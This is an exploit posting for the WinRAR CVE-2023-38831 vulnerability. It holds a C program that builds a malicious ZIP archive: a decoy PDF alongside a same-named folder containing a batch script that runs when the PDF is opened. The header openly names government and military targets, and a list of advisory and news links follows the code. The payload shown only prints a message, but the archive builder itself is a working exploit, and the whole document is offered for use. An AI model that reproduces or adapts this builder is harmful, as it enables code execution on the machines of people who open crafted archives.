################################################################################################
# Exploit Title :  EXPLOIT WinRAR version 6.22 Vulnerability CVE-2023-38831 #
# #
# Author : E1.Coders #
# #
# Contact : E1.Coders [at] Mail [dot] RU #
# #
# Security Risk : High #
# #
# Description : All target's GOV & Military websites #
# #
################################################################################################
# #
# Expl0iTs: #
 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "zip.h"
#define PDF_FILE "document.pdf"
#define FOLDER_NAME "document.pdf\\"
#define SCRIPT_FILE "script.bat"
#define ZIP_FILE "exploit.zip"
 
int main(void) {
    zipFile zf = zipOpen(ZIP_FILE, APPEND_STATUS_CREATE);
    if (zf == NULL) {
        printf("Error opening ZIP file\n");
        return -1;
    }
    zip_fileinfo zfi;
    memset(&zfi, 0, sizeof(zfi));
    if (zipOpenNewFileInZip(zf, PDF_FILE, &zfi, NULL, 0, NULL, 0, NULL, Z_DEFLATED, Z_DEFAULT_COMPRESSION) != ZIP_OK) {
        printf("Error adding PDF file to ZIP file\n");
        zipClose(zf, NULL);
        return -1;
    }
    FILE *fp = fopen(PDF_FILE, "rb");
    if (fp == NULL) {
        printf("Error opening PDF file\n");
        zipCloseFileInZip(zf);
        zipClose(zf, NULL);
        return -1;
    }
    char buffer[1024];
    int bytes_read;
    while ((bytes_read = fread(buffer, 1, sizeof(buffer), fp)) > 0) {
        if (zipWriteInFileInZip(zf, buffer, bytes_read) < 0) {
            printf("Error writing PDF file to ZIP file\n");
            fclose(fp);
            zipCloseFileInZip(zf);
            zipClose(zf, NULL);
            return -1;
        }
    }
    fclose(fp);
    zipCloseFileInZip(zf);
    if (zipOpenNewFileInZip(zf, FOLDER_NAME, &zfi, NULL, 0, NULL, 0, NULL, Z_DEFLATED, Z_DEFAULT_COMPRESSION) != ZIP_OK) {
        printf("Error adding folder to ZIP file\n");
        zipClose(zf, NULL);
        return -1;
    }
    zipCloseFileInZip(zf);
    char script_name[256];
    sprintf(script_name, "%s%s", FOLDER_NAME, SCRIPT_FILE);
    if (zipOpenNewFileInZip(zf, script_name, &zfi, NULL, 0, NULL, 0, NULL, Z_DEFLATED, Z_DEFAULT_COMPRESSION) != ZIP_OK) {
        printf("Error adding script file to ZIP file\n");
        zipClose(zf, NULL);
        return -1;
    }
    char script_content[] = "@echo off\nstart cmd /c \"echo You have been exploited by CVE-2023-38831 && pause\"\n";
    if (zipWriteInFileInZip(zf, script_content, strlen(script_content)) < 0) {
        printf("Error writing script file to ZIP file\n");
        zipCloseFileInZip(zf);
        zipClose(zf, NULL);
        return -1;
    }
    zipCloseFileInZip(zf);
 
    zipClose(zf, NULL);
 
    printf("ZIP file created successfully\n");
    return 0;
}

https://nvd.nist.gov/vuln/detail/CVE-2023-38831
https://nvd.nist.gov/vuln/detail/CVE-2023-38831
https://github.com/HDCE-inc/CVE-2023-38831
https://www.cvedetails.com/cve/CVE-2023-38831/
https://www.logpoint.com/en/blog/emerging-threats/cve-2023-38831-winrar-decompression-or-arbitrary-code-execution/
https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Exploit:Win32/CVE-2023-38831
http://packetstormsecurity.com/files/174573/WinRAR-Remote-Code-Execution.html
https://blog.google/threat-analysis-group/government-backed-actors-exploiting-winrar-vulnerability/
https://news.ycombinator.com/item?id=37236100
https://www.bleepingcomputer.com/news/security/winrar-zero-day-exploited-since-april-to-hack-trading-accounts/
https://www.group-ib.com/blog/cve-2023-38831-winrar-zero-day/
https://hdce.medium.com/cve-2023-38831-winrar-zero-day-poses-new-risks-for-traders-684911befad2
 